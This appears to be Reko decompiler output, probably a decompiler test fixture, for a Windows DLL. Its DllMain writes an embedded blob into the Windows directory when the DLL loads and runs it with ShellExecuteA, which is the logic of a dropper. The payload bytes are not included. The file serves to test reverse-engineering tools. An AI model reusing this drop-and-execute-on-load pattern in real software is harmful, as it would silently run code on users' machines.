// subject_reko_0000000000003000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_4 g_t10003000 = 0x5552; // 10003000
void g_v10003004 = ??void??; // 10003004
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t10001000 = 'o'; // 10001000
CHAR g_t10001025 = '\\'; // 10001025
word32 g_dw10001070 = 4284; // 10001070
word32 g_dw10001074 = 0x10CA; // 10001074
word32 g_dw10001078 = 0x10D8; // 10001078
word32 g_dw1000107C = 0x10F0; // 1000107C
word32 g_dw10001080 = 4348; // 10001080
word32 g_dw10001088 = 0x1116; // 10001088
<anonymous> * __imp__CloseHandle = &g_t10BC; // 10001090
<anonymous> * __imp__CreateFileA = &g_t10CA; // 10001094
<anonymous> * __imp__GetWindowsDirectoryA = &g_t10D8; // 10001098
<anonymous> * __imp__WriteFile = &g_t10F0; // 1000109C
<anonymous> * __imp__lstrcatA = &g_t10FC; // 100010A0
<anonymous> * __imp__ShellExecuteA = &g_t1116; // 100010A8
// 10001140: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
Eq_2 DllMain(Eq_3 hModule, Eq_4 dwReason, Eq_5 lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&g_t10001220, 0x0400);
		lstrcatA(&g_t10001220, &g_t10001025);
		if (fn1000119A(&g_t10001220) != 0x00)
			ShellExecuteA(null, &g_t10001000, &g_t10001220, null, null, 0x00);
	}
	return 0x01;
}

// 1000119A: Register word32 fn1000119A(Stack Eq_19 dwArg04)
// Called from:
//      DllMain
word32 fn1000119A(Eq_19 dwArg04)
{
	Eq_4 tLoc08;
	word32 ebx_15 = 0x00;
	Eq_3 eax_32 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_32 != (void *) ~0x00)
	{
		WriteFile(eax_32, &g_v10003004, g_t10003000, &tLoc08, null);
		CloseHandle(eax_32);
		ebx_15 = 0x01;
	}
	return ebx_15;
}

CHAR g_t10001220 = '\0'; // 10001220
